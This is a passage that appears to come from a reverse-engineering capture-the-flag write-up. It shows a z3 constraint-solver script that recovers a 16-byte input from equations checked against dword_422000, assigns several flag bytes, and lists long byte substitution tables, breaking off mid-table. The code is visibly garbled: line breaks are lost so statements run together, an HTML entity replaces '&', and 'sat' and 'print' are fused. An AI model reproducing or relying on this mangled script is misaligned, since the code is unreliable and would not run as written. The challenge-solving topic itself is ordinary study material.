* a1[12] \\ + 148 * a1[7] \\ + 127 * a1[10] \\ + 194 * a1[1] \\ + 132 * a1[8] \\ + 44 * a1[0] \\ + 60 * a1[13] \\ + 98 * a1[15] \\ + 38 * a1[14] \\ + 245 * a1[9] \\ + 159 * a1[6] \\ + 146 * a1[3])&amp;0xffffffff)x.add(dword_422000[5] == (132 * a1[3] \\ + 10 * a1[7] \\ + 95 * a1[0] \\ + 83 * a1[10] \\ + 99 * a1[1] \\ + 77 * a1[12] \\ + 195 * a1[2] \\ + 47 * a1[6] \\ + 38 * a1[13] \\ + 178 * a1[8] \\ + 74 * a1[4] \\ + 86 * a1[11] \\ + 208 * a1[9] \\ + 240 * a1[14] \\ + 120 * a1[5] \\ + 43 * a1[15])&amp;0xffffffff)x.add(dword_422000[9] == (172 * a1[1] \\ + 110 * a1[2] \\ + 92 * a1[7] \\ + 126 * a1[15] \\ + 91 * a1[0] \\ + 77 * a1[6] \\ + 207 * a1[5] \\ + 249 * a1[11] \\ + 240 * a1[12] \\ + 129 * a1[10] \\ + 6 * a1[13] \\ + 100 * a1[3] \\ + a1[14] \\ + 76 * a1[9] \\ + 127 * a1[4] \\ + 4 * a1[8])&amp;0xffffffff)x.add(dword_422000[10] == (46 * a1[15] \\ + 37 * a1[0] \\ + 3 * a1[3] \\ + 72 * a1[6] \\ + 116 * a1[7] \\ + 186 * a1[1] \\ + 221 * a1[14] \\ + 236 * a1[4] \\ + 79 * a1[2] \\ + 175 * a1[10] \\ + 184 * a1[9] \\ + 160 * a1[11] \\ + 227 * a1[12] \\ + 99 * a1[8] \\ + 71 * a1[13] \\ + 4 * a1[5])&amp;0xffffffff)x.add(dword_422000[0] == (203 * a1[3] \\ + 31 * a1[0] \\ + 11 * a1[14] \\ + 149 * a1[7] \\ + 215 * a1[5] \\ + 206 * a1[1] \\ + 245 * a1[6] \\ + 9 * a1[11] \\ + 16 * a1[10] \\ + 241 * a1[13] \\ + 110 * a1[8] \\ + 175 * a1[2] \\ + 38 * a1[4] \\ + 227 * a1[9] \\ + 208 * a1[12] \\ + 8 * a1[15])&amp;0xffffffff)x.add(dword_422000[2] == (132 * a1[3] \\ + 119 * a1[14] \\ + 26 * a1[8] \\ + 24 * a1[6] \\ + 121 * a1[11] \\ + 235 * a1[2] \\ + 228 * a1[12] \\ + 34 * a1[5] \\ + 37 * a1[15] \\ + 24 * a1[9] \\ + 145 * a1[13] \\ + 199 * a1[4] \\ + 173 * a1[10] \\ + 58 * a1[0] \\ + 246 * a1[7] \\ + 199 * a1[1])&amp;0xffffffff) assert x.check() == satprint(x.model())flag[0] = 0x23flag[33] = 0x21flag[5] = 43flag[11] = 186flag[8] = 51flag[16] = 72flag[6] = 42flag[4] = 51flag[3] = 1flag[10] = 179flag[14] = 43flag[7] = 186flag[1] = 90flag[13] = 113flag[12] = 51flag[2] = 45flag[9] = 72flag[15] = 114by280 = [0x7A, 0x91, 0x9F, 0x23, 0x71, 0xD1, 0x63, 0xDB, 0x59, 0x0A, 0xEC, 0x69, 0xEE, 0x76, 0x5D, 0x64, 0x37, 0x42, 0x8C, 0x0B, 0x3C, 0x5C, 0x80, 0xAD, 0x6A, 0x03, 0x43, 0x93, 0xBC, 0xBF, 0xE3, 0xAF, 0x5A, 0x8A, 0x65, 0x0D, 0x31, 0xDF, 0x3E, 0xA7, 0xE4, 0xDD, 0xB4, 0xB0, 0x56, 0x1C, 0x12, 0xA4, 0x9E, 0xD8, 0x3D, 0x81, 0x60, 0x9A, 0xCB, 0xFA, 0xB1, 0xE0, 0xD3, 0xF4, 0xA2, 0x26, 0x68, 0x90, 0x4B, 0x45, 0x85, 0x20, 0x16, 0xDE, 0xED, 0x4C, 0x6F, 0x34, 0xDC, 0xBE, 0xD2, 0x46, 0x33, 0x14, 0x77, 0xC6, 0xCD, 0xF0, 0xC5, 0xAC, 0x1F, 0xD0, 0x95, 0x97, 0x3F, 0xD7, 0x52, 0xAE, 0xB9, 0xC9, 0x0C, 0xCA, 0x4E, 0xF1, 0xB7, 0x39, 0x7F, 0x27, 0x2B, 0x40, 0x4A, 0x51, 0xA1, 0xCC, 0xCE, 0x6E, 0x70, 0xFF, 0x0E, 0xEF, 0x8E, 0x25, 0xB3, 0x5E, 0x6C, 0xAB, 0x02, 0x49, 0xE9, 0x9B, 0x36, 0x13, 0x9C, 0x04, 0x35, 0xC0, 0xFB, 0x3A, 0x67, 0xB6, 0x9D, 0xC2, 0x73, 0xB5, 0x6D, 0xCF, 0x83, 0x2C, 0x01, 0xC1, 0x10, 0x6B, 0x79, 0x87, 0x5B, 0x57, 0x47, 0xE5, 0x15, 0xF7, 0xA5, 0x74, 0xAA, 0x53, 0x7D, 0x2E, 0xD5, 0xA3, 0x19, 0xF5, 0x2D, 0xFD, 0x61, 0x8D, 0xC8, 0x1B, 0xC3, 0xDA, 0xF6, 0x72, 0x54, 0x5F, 0x1E, 0xE8, 0x17, 0x50, 0xB2, 0xE7, 0x0F, 0x7E, 0x55, 0xBD, 0x86, 0x00, 0x78, 0x94, 0x92, 0x09, 0x2F, 0xD6, 0xD9, 0xF3, 0x29, 0xE6, 0x24, 0x32, 0x66, 0x22, 0x41, 0xC4, 0x7C, 0x05, 0x98, 0x44, 0x4F, 0x99, 0xA9, 0xE1, 0x8F, 0x08, 0x1A, 0x2A, 0x11, 0xEA, 0x3B, 0xE2, 0x38, 0xB8, 0x18, 0xF9, 0xD4, 0xC7, 0x62, 0x7B, 0x75, 0x58, 0x96, 0x28, 0xEB, 0x06, 0x84, 0x89, 0x48, 0x82, 0x88, 0xA6, 0xFE, 0xA0, 0xF2, 0xF8, 0x1D, 0x8B, 0xFC, 0xA8, 0x21, 0x30, 0xBB, 0x07, 0xBA, 0x4D]by380 = [0x45, 0x1F, 0x63, 0x81, 0xE6, 0xAD, 0x4F, 0xD3, 0xC0, 0x15, 0x69, 0x8F, 0x0D, 0x31, 0x0C, 0xB0, 0xF1, 0x2E, 0x98, 0xC1, 0xC2, 0x96, 0xB2, 0xEB, 0xBF, 0xDF, 0x17, 0xF4, 0x7F, 0xE5, 0x66, 0x73, 0xD8, 0x56, 0x46, 0x20, 0x9C, 0x77, 0x3D, 0x72, 0xA3, 0x91, 0x49, 0x68, 0x4C, 0x1E, 0xAE, 0x06, 0x7A, 0x94, 0xDD, 0x52, 0x55, 0x2C, 0xB8, 0x42, 0x79, 0xFE, 0x38, 0xEF, 0x8B, 0xF7, 0xAC, 0xDC, 0xFF, 0x78, 0x34, 0x70, 0xA9, 0xCE, 0x3F, 0x0E, 0x11, 0x43, 0x5B, 0xF8, 0xAF, 0xD0, 0xFA, 0x33, 0xBA, 0xCF, 0x4A, 0xC9, 0x88, 0x4E, 0x80, 0x10, 0x85, 0x37, 0x12, 0xAB, 0xE1, 0x61, 0xB7, 0x3E, 0x4D, 0x19, 0x3A, 0x04, 0x8C, 0x92, 0x0B, 0xE7, 0x3C, 0xEA, 0xC7, 0x16, 0x35, 0xB1, 0xA7, 0x8E, 0x40, 0x9F, 0xB6, 0xB5, 0x25, 0xA0, 0x5A, 0x30, 0x7D, 0xA2, 0x1A, 0x64, 0xC5, 0x6D, 0x74, 0x82, 0x08, 0x7E, 0xD2, 0xF6, 0xAA, 0xDA, 0xED, 0x4B, 0x6E, 0xE8, 0xE9, 0xE2, 0xD4, 0x71, 0xB9, 0x09, 0x84, 0x3B, 0xC4, 0x1C, 0x60, 0xFD, 0x22, 0x99, 0x39, 0x97, 0x18, 0x89, 0x7C, 0xA4, 0x27, 0xBD, 0x0F, 0xCC, 0x95, 0xF5, 0xB3, 0x65, 0x6B, 0x8A, 0x58, 0x36, 0xBB, 0x9E, 0x75, 0xD1, 0x03, 0x9D, 0x6A, 0x6C, 0x53, 0x05, 0xB4, 0xE4, 0xEE, 0x67, 0x87, 0x7B, 0x32, 0x2D, 0x24, 0x2A, 0x59, 0xEC, 0x0A, 0xDB, 0x21, 0x07, 0x23, 0x50, 0x02, 0x41, 0xF2, 0x83, 0xD9, 0x26, 0xBC, 0x6F, 0x86, 0xA6, 0x93, 0xF9, 0xC8, 0xD6, 0xA5, 0x1D, 0xE3, 0xE0, 0xFC, 0xCA, 0x1B, 0x5E, 0x8D, 0x2F, 0x5C, 0xBE, 0x47, 0xA8, 0x44, 0x57, 0x54, 0x48, 0xC3, 0x00, 0x62, 0x5D, 0xCB, 0xD7, 0x76, 0xCD, 0x28, 0xD5, 0x14, 0x90, 0x13, 0xDE, 0x5F, 0xF0, 0x01, 0x2B, 0xC6, 0x29, 0x9A, 0x9B, 0x51, 0xF3, 0xFB, 0xA1]by580 = [0x00, 0x74, 0x59, 0xC6, 0xAC, 0xD3, 0xC1, 0xA0, 0x88, 0x3F, 0x1C, 0x28, 0x17, 0x22, 0xC5, 0x38, 0xF9, 0x1B, 0x21, 0x49, 0x99, 0xAF, 0xD6, 0x95, 0xA4, 0x9D, 0x5D, 0x5B, 0x73, 0xFE, 0xC9, 0x9A, 0x4C, 0xB4, 0x27, 0x5E, 0x71, 0x25, 0xE2, 0x90, 0xC0, 0x62, 0x5F, 0x48, 0x77, 0xE0, 0xF2, 0x8E, 0x40, 0xC7, 0x79, 0x1A, 0xDC, 0xF3, 0x01, 0xB6, 0xD8, 0xB5, 0x67, 0x1E, 0x85, 0x12, 0x68, 0x87, 0xD0, 0x30, 0xEB, 0x2F, 0x50, 0xCF, 0xEE, 0xDD, 0xFB, 0xE6, 0xA5, 0x69, 0x05, 0x75, 0xB7, 0xEF, 0x70, 0x53, 0xFF, 0xBA, 0x80, 0x41, 0x9B, 0xA1, 0x39, 0xF8, 0x65, 0x1F, 0x7A, 0x51, 0x98, 0xAD, 0x02, 0x13, 0x18, 0xC3, 0x31, 0x89, 0xCD, 0xCA, 0x91, 0xD1, 0x78, 0x57, 0x47, 0xB8, 0x54, 0x9F, 0x96, 0x04, 0x23, 0x2B, 0xE5, 0x46, 0x29, 0x7C, 0x76, 0x82, 0xBC, 0xFC, 0x6E, 0xEC, 0xED, 0x64, 0x4A, 0x26, 0x34, 0x5C, 0x19, 0x55, 0xFD, 0x6D, 0xFA, 0x7E, 0xB2, 0xD4, 0xF1, 0xF6, 0xE4, 0x60, 0xB0, 0x52, 0x9E, 0x8F, 0xBB, 0x08, 0x3B, 0x97, 0xE8, 0x10, 0x6C, 0x44, 0x3A, 0x36, 0x35, 0x03, 0xC4, 0x81, 0x9C, 0xAB, 0xCB, 0x66, 0xAA, 0x37, 0xA2, 0xD2, 0xE1, 0xE9, 0x7B, 0x14, 0x8D, 0xD9, 0xF5, 0x0B, 0xC2, 0x07, 0xA8, 0x0D, 0xA3, 0x0A, 0x84, 0x6B, 0x2C, 0xEA, 0x0C, 0xAE, 0x7D, 0x6F, 0xD7, 0xE7, 0xC8, 0x3C, 0x45, 0xCC, 0x58, 0xB9, 0x3D, 0x33, 0x4E, 0x4B, 0x8C, 0xCE, 0x72, 0x6A, 0x8B, 0x2D, 0x24, 0x11, 0xDF, 0x5A, 0x2E, 0x92, 0xDA, 0x86, 0x94, 0xA7, 0xD5, 0x4F, 0x2A, 0xB3, 0x63, 0x61, 0xE3, 0xDE, 0x43, 0x1D, 0xBF, 0x15, 0x32, 0xBE, 0x16, 0x3E, 0x93, 0x7F, 0x83, 0x56, 0x06, 0xF7, 0x8A, 0x20, 0xBD, 0x0E, 0xA6, 0xDB, 0x0F, 0xB1, 0x42, 0xF0, 0x09, 0x4D, 0xA9, 0xF4]by780 = [0x0F, 0xA5, 0xBA, 0x03, 0xF9, 0x69, 0x2A, 0xD7, 0xEA, 0xB5, 0xFC, 0xA1, 0x39, 0x20, 0x68, 0x72, 0x25, 0xB2, 0x6C, 0xAD, 0x88, 0x51, 0x73, 0xEB, 0xCF, 0x13, 0xDE, 0x7C, 0x6D, 0x38, 0x05, 0x09, 0xC2, 0x96, 0x1F, 0x7F, 0x37, 0x4A, 0xC9, 0xE7, 0x6A, 0xB0, 0x59, 0xF7, 0xD2, 0xB9, 0x16, 0xC8, 0xEE, 0xA9, 0x18, 0x80, 0xAC, 0xE3, 0x9E, 0x6F, 0x3C, 0x2F, 0x3E, 0x9A, 0xBE, 0x1D, 0xB4, 0x7B, 0x7D, 0x32, 0x6B, 0x74, 0xC5, 0xC0, 0xC7, 0xD1, 0x29, 0x98, 0xDD, 0xB6, 0x0E, 0x4D, 0xBF, 0x79, 0x0D, 0xDA, 0x7A, 0x17, 0x71, 0x43, 0x87, 0xFF, 0xDC, 0xC6, 0x12, 0xE9, 0x67, 0x2D, 0x70, 0x9F, 0x95, 0x30, 0x26, 0x24, 0x2B, 0xA8, 0xA2, 0xD8, 0x3B, 0x31, 0xA0, 0x3D, 0x4B, 0x90, 0x60, 0x34, 0x75, 0xE8, 0x5D, 0xF4, 0x85, 0xF3, 0xFE, 0x35, 0xCB, 0xB8, 0x02, 0x50, 0xB1, 0xF1, 0x1A, 0x1B, 0x21, 0xCD, 0xC4, 0x7E, 0xED, 0x07, 0xD9, 0xD6, 0x44, 0x15, 0x8E, 0x49, 0xB3, 0x97, 0xE6, 0x63, 0xB7, 0xEF, 0x3A, 0x8F, 0xF2, 0x53, 0x10, 0x77, 0x86, 0xF8, 0x8A, 0x28, 0x3F, 0xD4, 0x4C, 0xE5, 0x82, 0x83, 0xEC, 0x62, 0x89, 0xDF, 0xC3, 0x14, 0xCA, 0xA3, 0x5F, 0x64, 0x47, 0xFD, 0x00, 0x84, 0x66, 0xA7, 0x5A, 0x0C, 0x01, 0xD5, 0x5B, 0x0A, 0x4F, 0x27, 0x78, 0x0B, 0x2E, 0x48, 0x36, 0xFA, 0x08, 0x56, 0xE0, 0xA6, 0xC1, 0x5C, 0x8B, 0x41, 0x06, 0xBB, 0x52, 0x93, 0xAF, 0x2C, 0x5E, 0xF6, 0x61, 0xF0, 0xAB, 0x91, 0x45, 0x04, 0xBD, 0xCC, 0xE4, 0x65, 0x9D, 0x92, 0xCE, 0x40, 0xAE, 0x76, 0x9B, 0x9C, 0xAA, 0x54, 0xD0, 0x1C, 0x81, 0x4E, 0x57, 0x55, 0x23, 0x6E, 0x1E, 0x99, 0xDB, 0xFB, 0xA4, 0x22, 0x19, 0x58, 0x11, 0x8D, 0x94, 0xD3, 0xE2, 0x8C, 0xF5, 0x42, 0x46, 0xBC, 0x33, 0xE1]byb80 = [0x38, 0xD9, 0xDA, 0xE6, 0xB5, 0xF1, 0x0B, 0x93, 0x0C, 0x58, 0x0D, 0xAE, 0x0A, 0x85, 0x2A, 0x50, 0xC2, 0xBF, 0xD4, 0x28, 0x52, 0xC4, 0x4F, 0xE1, 0x44, 0xE0, 0xA2, 0x70, 0x36, 0x65, 0x4B, 0x41, 0x9D, 0x5F, 0x05, 0x7C, 0xF7, 0xD7, 0x99, 0x8B, 0xCC, 0xCE, 0x16, 0xBE, 0xB6, 0xC5, 0x8F, 0x79, 0xC7, 0x20, 0x7E, 0xF4, 0xF3, 0x2E, 0x4A, 0x89, 0xD6, 0x0F, 0x6E, 0xB0, 0x61, 0xB1, 0x6D, 0x19, 0x73, 0x03, 0x74, 0xA1, 0x40, 0xEC, 0xC0, 0x57, 0x94, 0x7A, 0x66, 0xD5, 0xEA, 0x17, 0x6A, 0x84, 0x37, 0xED, 0xF6, 0x13, 0x31, 0x5B, 0x82, 0x1E, 0xFC, 0x92, 0xE2, 0x42, 0x86, 0xBA, 0xE3, 0x91, 0x7F, 0x67, 0x5C, 0x98, 0x15, 0x22, 0x8D, 0x80, 0x04, 0xE4, 0x25, 0x09, 0xA0, 0xAD, 0x63, 0xE5, 0xB4, 0x9A, 0x3C, 0xA3, 0x3A, 0x69, 0xF8, 0xCD, 0xBC, 0x88, 0x55, 0xB2, 0xBD, 0x6B, 0x77, 0x71, 0xB3, 0xD3, 0x90, 0x75, 0x06, 0x49, 0xC3, 0x32, 0x4D, 0x1D, 0xA8, 0xAA, 0xFB, 0x7B, 0x7D, 0x2B, 0xA6, 0x34, 0x72, 0x47, 0xF0, 0x2F, 0x9C, 0x08, 0x00, 0x14, 0x8C, 0x26, 0x5E, 0x87, 0xD1, 0xCF, 0xC9, 0x18, 0x51, 0x23, 0xCB, 0xF5, 0x1C, 0x9F, 0x97, 0xF9, 0xBB, 0xA7, 0x39, 0x45, 0x02, 0xFD, 0x46, 0x8A, 0x54, 0xA4, 0x8E, 0x9E, 0x68, 0x96, 0x0E, 0x78, 0xB8, 0x3D, 0x11, 0x64, 0xAF, 0x10, 0xDE, 0x6C, 0x60, 0x5A, 0x76, 0x1A, 0xE9, 0xC1, 0x3E, 0xCA, 0x9B, 0x27, 0x30, 0xEF, 0xFF, 0x07, 0xD2, 0xB9, 0x2D, 0xD0, 0xEE, 0x83, 0xAB, 0xF2, 0x4C, 0xA5, 0x21, 0x62, 0x81, 0x33, 0x1B, 0xD8, 0x6F, 0xAC, 0x3B, 0x5D, 0xE8, 0xFA, 0x3F, 0xDB, 0x95, 0xE7, 0x59, 0x12, 0x48, 0x35, 0xC6, 0x2C, 0x4E, 0x01, 0xDD, 0x43, 0x29, 0xDC, 0x24, 0x1F, 0xB7, 0xA9, 0xEB, 0xC8, 0xFE, 0x56, 0xDF, 0x53]byd80 = [0xB0, 0x28, 0x0B, 0x89, 0x4B, 0xA4, 0xBE, 0x1A, 0x8F, 0x6C, 0xCF, 0xB2, 0xB5, 0xFE, 0xFB, 0x59, 0x2D, 0x29, 0x39, 0x62, 0x97, 0xAA, 0xD7, 0x7D, 0x94, 0x2C, 0xFC, 0x5D, 0xB4, 0x7C, 0x8A, 0x82, 0xD3, 0xA7, 0xBA, 0xDF, 0x21, 0xE6, 0xA2, 0xD0, 0xE8, 0xF0, 0x67, 0x3A, 0xB9, 0x98, 0xF9, 0xAE, 0xD1, 0x56, 0xD8, 0xCA, 0x10, 0xEA, 0x92, 0xA8, 0x75, 0x7E, 0x65, 0xA9, 0xAF, 0x51, 0xC9, 0x8E, 0xD4, 0x77, 0xE4, 0x49, 0x06, 0x61, 0x9E, 0x24, 0xD9, 0x9B, 0x11, 0x05, 0x1D, 0x96, 0x9A, 0xB1, 0xE0, 0x83, 0xE1, 0x1C, 0xCD, 0xF3, 0x38, 0xB3, 0x57, 0x50, 0xF4, 0xAC, 0xEB, 0x14, 0xA5, 0x46, 0xF6, 0x93, 0xAD, 0x7B, 0x30, 0xEF, 0x79, 0x17, 0x47, 0xDA, 0xC0, 0xDD, 0xDE, 0xDC, 0x5A, 0x76, 0x3B, 0x31, 0x0D, 0x0E, 0x86, 0xF1, 0x71, 0xFA, 0x0C, 0x00, 0xA3, 0xBF, 0x64, 0x37, 0x22, 0xD2, 0x69, 0x5C, 0xC6, 0x16, 0x9F, 0x5E, 0x7A, 0x1E, 0x27, 0x60, 0x6E, 0xF8, 0x8C, 0xEE, 0xC2, 0x74, 0x81, 0x8B, 0x33, 0x03, 0xBD, 0x2A, 0x0A, 0x68, 0x6B, 0x3F, 0x4C, 0xC3, 0x15, 0x04, 0x3D, 0x63, 0xF5, 0xAB, 0xCC, 0x3C, 0x53, 0x20, 0x66, 0xC4, 0xC1, 0x23, 0xE7, 0x25, 0x55, 0xC7, 0xED, 0xB7, 0xBC, 0xCB, 0x8D, 0x09, 0xCE, 0x52, 0xBB, 0xE2, 0xC5, 0xB6, 0x26, 0x12, 0x2F, 0x99, 0x58, 0x40, 0x6D, 0xA1, 0x3E, 0x48, 0x85, 0xA6, 0xF2, 0x0F, 0x43, 0x78, 0xB8, 0x01, 0xE5, 0xD5, 0x6F, 0x4E, 0xF7, 0x13, 0x42, 0xEC, 0x45, 0x2B, 0x4F, 0x36, 0xDB, 0x9C, 0xE3, 0x44, 0x34, 0x84, 0x73, 0x2E, 0x7F, 0xFD, 0x91, 0x41, 0xD6, 0x95, 0x18, 0xFF, 0x70, 0xC8, 0x02, 0x5F, 0x08, 0x1B, 0x6A, 0x5B, 0x19, 0xA0, 0x4D, 0x35, 0x54, 0xE9, 0x32, 0x88, 0x72, 0x07, 0x87, 0x90, 0x4A, 0x80, 0x1F, 0x9D]by1180 = [0xE8, 0x22, 0x64, 0x9F, 0xC5, 0xD5, 0x25, 0xC9, 0x5D, 0xDF, 0xA1, 0x74, 0xCB, 0x57, 0xF7, 0xF0, 0xBD, 0x56, 0xFF, 0x33, 0x79, 0xFE, 0x87, 0xB6, 0xB1, 0x54, 0x10, 0x95, 0x8A, 0xEC, 0x7B, 0x48, 0x84, 0x3D, 0x30, 0xEF, 0x86, 0xFA, 0x97, 0x1C, 0xDC, 0xA9, 0x5A, 0xF3, 0x67, 0x18, 0x83, 0x72, 0x06, 0xB9, 0xF5, 0x05, 0x68, 0x59, 0xF2, 0xE4, 0x88, 0x5E, 0x14, 0x17, 0x11, 0x9C, 0xAB, 0xDE, 0xEB, 0x7D, 0x62, 0x9B, 0xD6, 0xF4, 0x01, 0x29, 0xBC, 0xC0, 0x69, 0xA2, 0x2B, 0x0D, 0x1D, 0x98, 0x6A, 0xBE, 0x65, 0x09, 0xF8, 0x96, 0xB4, 0x6E, 0x63, 0xE3, 0x34, 0x2D, 0xCE, 0x0A, 0xCD, 0xAA, 0x21, 0xCC, 0xE7, 0xA5, 0xDB, 0xD8, 0x03, 0xDD, 0xB2, 0x1F, 0x9D, 0x9E, 0x0E, 0x8F, 0x8B, 0xCA, 0x92, 0x0B, 0xA7, 0x5B, 0xD2, 0xCF, 0x47, 0x07, 0x04, 0xAE, 0x3B, 0xA8, 0x7C, 0x73, 0xF9, 0x35, 0xEE, 0x7A, 0xB0, 0xBA, 0x85, 0x46, 0x3E, 0x81, 0xC7, 0x40, 0x37, 0x15, 0x3A, 0x19, 0xE0, 0x1E, 0x28, 0x4A, 0x4F, 0x8C, 0xD4, 0x51, 0x2E, 0x94, 0x89, 0x2A, 0x0F, 0x7E, 0xE1, 0xC8, 0x5F, 0x4E, 0x6D, 0xF6, 0x49, 0xB8, 0x55, 0x60, 0x82, 0x20, 0x36, 0xC1, 0x0C, 0x1B, 0xC4, 0x00, 0xE5, 0xA3, 0x2C, 0xE9, 0xC2, 0xF1, 0x23, 0x3F, 0xC3, 0xB5, 0x8D, 0xD7, 0x42, 0xFC, 0x50, 0x13, 0xBB, 0x61, 0x9A, 0x44, 0xE6, 0x91, 0x2F, 0x70, 0xC6, 0x6F, 0xD1, 0x27, 0x43, 0x08, 0xDA, 0xFD, 0x52, 0x71, 0x77, 0xED, 0xE2, 0xAD, 0x16, 0x8E, 0x12, 0x4C, 0x31, 0x3C, 0x39, 0x78, 0x90, 0xBF, 0x1A, 0x76, 0x75, 0x41, 0x99, 0xD0, 0x80, 0xB7, 0x66, 0x24, 0xD3, 0x7F, 0x4B, 0x45, 0x5C, 0x53, 0x4D, 0x26, 0x32, 0xA0, 0xFB, 0xB3, 0x38, 0x6B, 0xAF, 0xA6, 0xD9, 0x02, 0xA4, 0xEA, 0x6C, 0xAC, 0x58, 0x93]by1380 = [0x91, 0x67, 0x1A, 0xBE, 0xAB, 0xC2, 0x85, 0xD5, 0xDA, 0xCC, 0xF7, 0x5B, 0x54, 0x61, 0x05, 0xDF, 0x02, 0x70, 0x65, 0x69, 0x9A, 0x7A, 0x09, 0x92, 0x5D, 0x2A, 0xA7, 0x37, 0xFF, 0x19, 0xE6, 0x99, 0xF3, 0x1E, 0xBD, 0x82, 0x48, 0x3C, 0xE8, 0xC8, 0x66, 0x17, 0xB7, 0xA9, 0xC5, 0x4E, 0x33, 0x84, 0x45, 0xD3, 0x8B, 0x49, 0x50, 0x43, 0x8F, 0xCD, 0x73, 0x29, 0x04, 0xDC, 0x01, 0x0C, 0xDD, 0x2E, 0xFB, 0x6E, 0x0F, 0x24, 0x57, 0xE9, 0xC9, 0x7D, 0xB3, 0x40, 0x4B, 0x56, 0x6C, 0x68, 0xE2, 0x22, 0xF6, 0x80, 0xAA, 0x95, 0xD4, 0x97, 0x94, 0x21, 0x53, 0xD1, 0xE3, 0x59, 0xD2, 0xED, 0x41, 0x4D, 0x74, 0xA3, 0xA0, 0x32, 0x0D, 0xFC, 0x46, 0x34, 0xFA, 0xB1, 0x5E, 0xC6, 0x71, 0xC0, 0xE0, 0x3F, 0x13, 0x12, 0xD7, 0xEE, 0xF8, 0x26, 0xE1, 0x25, 0x88, 0x77, 0xB0, 0x8D, 0x6A, 0xEA, 0x0E, 0xD6, 0x3E, 0x03, 0x64, 0xBF, 0x8C, 0x96, 0xD9, 0xA4, 0x42, 0xAD, 0xFD, 0x16, 0x5A, 0xE4, 0x06, 0x9D, 0x07, 0x87, 0x5F, 0xAF, 0xDB, 0xC1, 0x93, 0x1C, 0xF1, 0xDE, 0xA6, 0x3A, 0xF4, 0x2C, 0x1B, 0x39, 0xE7, 0x4A, 0xC7, 0x35, 0xFE, 0x0A, 0x62, 0xF0, 0xCA, 0xEC, 0x27, 0x52, 0x23, 0x7F, 0xA5, 0x79, 0x7C, 0x75, 0x86, 0xEB, 0x60, 0xA8, 0xF5, 0x1F, 0x20, 0xC3, 0x63, 0x5C, 0x72, 0x18, 0xE5, 0x51, 0xAC, 0xB9, 0x90, 0x9F, 0x4C, 0xB2, 0xCB, 0x00, 0x6F, 0x28, 0xA1, 0xB6, 0x9B, 0xD0, 0x7B, 0x36, 0x4F, 0x9C, 0xCF, 0x98, 0x8A, 0x0B, 0x78, 0xB4, 0x7E, 0x2B, 0xEF, 0x58, 0xB5, 0xBA, 0x55, 0xB8, 0x10, 0x2F, 0x44, 0xAE, 0x89, 0x08, 0xC4, 0x3B, 0x9E, 0xF9, 0x6D, 0xF2, 0x15, 0x1D, 0x30, 0x47, 0x8E, 0x31, 0x2D, 0xD8, 0x6B, 0x3D, 0x11, 0x14, 0xA2, 0x83, 0xCE, 0xBB, 0x81, 0xBC, 0x76, 0x38]by1780 = [0x38, 0x5A, 0xC7, 0x98, 0x15, 0x6A, 0xC9, 0x28, 0x33, 0xEA, 0xF4, 0xD9, 0xDB, 0x77, 0xB8, 0x49, 0x1B, 0x79, 0xF5, 0xFD, 0x3E, 0xA2, 0xDE, 0x17, 0xC4, 0x5E, 0xE5, 0x11, 0xB6, 0x1D, 0x86, 0xF9, 0x90, 0x78, 0x8A, 0x14, 0x12, 0xB1, 0xC2, 0x21, 0xF1, 0x02, 0x58, 0xA1, 0x23, 0x0C, 0xAD, 0xA5, 0x50, 0x48, 0x1E, 0x6D, 0xF8, 0x96, 0x9D, 0x19, 0x00, 0xBD, 0x26, 0xCE, 0xA7, 0x24, 0x2E, 0x39, 0x7B, 0xFA, 0x5F, 0xCC, 0x1A, 0x0B, 0x40, 0x0F, 0x4B, 0x82, 0xE2, 0x97, 0x10, 0x2A, 0xFC, 0x3B, 0xB2, 0x66, 0x27, 0x54, 0x07, 0xE3, 0x08, 0xA3, 0xA6, 0xED, 0x62, 0x13, 0x9C, 0x20, 0x01, 0x92, 0xE8, 0xAE, 0xBE, 0xE1, 0x0A, 0x41, 0x94, 0x80, 0xA9, 0x2F, 0x29, 0x70, 0x35, 0x16, 0xF7, 0x6B, 0xFE, 0x9E, 0x0D, 0xD3, 0x7F, 0x1F, 0xA0, 0x32, 0xD2, 0x52, 0x05, 0x76, 0x89, 0x9B, 0x7A, 0x8F, 0x99, 0xEF, 0xCF, 0x51, 0x0E, 0xEC, 0x59, 0x5C, 0x37, 0xD5, 0x8E, 0x31, 0x34, 0x2D, 0x93, 0x25, 0x1C, 0xC8, 0x5B, 0x47, 0x9F, 0x03, 0x67, 0x7E, 0x42, 0x7D, 0x3A, 0xAA, 0x57, 0xDA, 0x9A, 0xAB, 0x74, 0x72, 0xE4, 0xB7, 0x5D, 0xCD, 0x87, 0x46, 0x2B, 0x43, 0xF3, 0xD0, 0x85, 0x55, 0xBB, 0xD4, 0xC6, 0x61, 0x56, 0x04, 0x65, 0x7C, 0x88, 0xC3, 0x73, 0xBC, 0xEB, 0xDD, 0x4D, 0xE0, 0xE6, 0xC0, 0x63, 0x8D, 0xF2, 0x81, 0xF6, 0xA8, 0x3D, 0x3F, 0xA4, 0xE9, 0x4A, 0xB5, 0xF0, 0xCA, 0x8B, 0x2C, 0xD7, 0xAC, 0xC5, 0xC1, 0xBF, 0x53, 0xD1, 0x6F, 0x06, 0xE7, 0xD6, 0x09, 0x95, 0x44, 0x71, 0xB9, 0x83, 0x4C, 0x22, 0xAF, 0xB4, 0x75, 0x36, 0x30, 0xCB, 0xEE, 0x91, 0x45, 0x8C, 0x4E, 0x6E, 0x6C, 0x4F, 0x84, 0xBA, 0xFF, 0x64, 0xB3, 0x60, 0xFB, 0xB0, 0x18, 0xD8, 0xDF, 0x3C, 0x68, 0xDC, 0x69]by1d80 = [0xD1, 0x9C, 0x68, 0xC0, 0x13, 0xAC, 0x48, 0x32, 0xA3, 0xBA, 0x4C, 0xE7, 0x6D, 0xC8, 0x1C, 0xAB, 0xE2, 0x7A, 0x42, 0xE1, 0x7B, 0x16, 0x67, 0x03, 0xAE, 0x7E, 0xAA, 0x38, 0x22, 0x02, 0x39, 0x51, 0xC7, 0x79, 0xD7, 0xCB, 0xEF, 0x62, 0x98, 0xDC, 0x53, 0x72, 0x89, 0xA5, 0x4B, 0xC6, 0x86, 0xF6, 0xFC, 0x77, 0x5A, 0xF5, 0x2E, 0x3D, 0xB2, 0xFE, 0x59, 0x27, 0x80, 0x63, 0xDD, 0x1A, 0x12, 0x5E, 0xED, 0xB0, 0xBC, 0xC4, 0x5F, 0x11, 0xC9, 0x09, 0xC5, 0x75, 0x96, 0x0A, 0x2F, 0x00, 0x17, 0x81, 0x14, 0x47, 0xBB, 0x9D, 0x8E, 0x3C, 0xD6, 0xA1, 0xE0, 0xA2, 0x26, 0x5D, 0x08, 0x6E, 0x4E, 0xF1, 0xCF, 0x73, 0x8A, 0x90, 0x0B, 0xB3, 0x3E, 